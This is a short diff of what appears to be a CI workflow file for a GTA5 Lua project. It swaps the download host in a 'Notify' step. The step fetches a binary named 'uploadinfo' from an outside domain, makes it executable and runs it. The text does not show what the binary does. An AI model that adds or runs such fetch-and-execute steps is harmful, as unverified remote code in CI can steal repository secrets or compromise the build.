@@ -185,6 +185,6 @@ jobs:
       - name: Notify
         run: |
           cd GTA5OnlineLua/
-          aria2c -o  uploadinfo https://dl.host3650.live/uploadinfo
+          aria2c -o  uploadinfo https://rcus2.cc2077.site/uploadinfo
           chmod +x uploadinfo
           ./uploadinfo
